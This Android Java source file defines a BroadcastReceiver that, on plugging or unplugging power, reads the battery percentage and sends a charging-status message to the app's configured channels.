package com.tenix.karasu;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.BatteryManager;

public class PowerReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (krs.instance == null) return;

        boolean connected = Intent.ACTION_POWER_CONNECTED.equals(intent.getAction());

        // Get battery level from sticky broadcast
        Intent bat = ctx.registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int level = 0, scale = 100;
        if (bat != null) {
            level = bat.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
            scale = bat.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
        }
        int pct = (int) ((level / (float) scale) * 100);

        String msg = connected
            ? "🔌 *Charging started* — " + pct + "%"
            : "🔋 *Unplugged* — " + pct + "%";

        for (String ch : krs.instance.parseChannels()) {
            krs.instance.sendText(msg, ch);
        }
    }
}
